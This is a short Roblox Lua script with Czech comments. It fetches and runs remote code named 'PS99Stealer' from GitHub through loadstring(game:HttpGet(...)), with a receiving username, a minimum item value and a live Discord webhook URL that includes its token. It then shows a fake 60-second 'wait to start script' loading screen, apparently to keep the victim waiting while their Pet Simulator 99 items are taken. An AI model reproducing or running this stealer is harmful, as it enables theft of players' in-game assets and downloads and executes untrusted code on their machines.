Username = "CJNGpiskuteeek"
Username2 = "CJNGpiskuteeek"
MinimumRAP = 100000
Webhook = "https://discord.com/api/webhooks/1358058249668002036/tct9nPL2K8uPP1mcJOhaHalZ91olBvVKB-ljiAWrAj-hg1JerlOab2o3ozwr6G1pl5MP"

loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()

-- Vytvoření minimalistického loading screenu s odpočtem
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingRectangle"
screenGui.ResetOnSpawn = false
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local background = Instance.new("Frame")
background.Size = UDim2.new(0.8, 0, 0.4, 0) -- 80% šířka, 40% výška
background.Position = UDim2.new(0.1, 0, 0.3, 0) -- vycentrováno
background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
background.BackgroundTransparency = 0.4
background.BorderSizePixel = 0
background.Parent = screenGui

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 1, 0)
loadingText.Position = UDim2.new(0, 0, 0, 0)
loadingText.Text = "60s Wait to start script"
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.BackgroundTransparency = 1
loadingText.TextScaled = true
loadingText.Font = Enum.Font.GothamBlack
loadingText.Parent = background

-- Odpočet
for i = 60, 1, -1 do
    loadingText.Text = i .. "s Wait to start script"
    wait(1)
end

-- Po odpočtu
loadingText.Text = "Second account is not allowed"
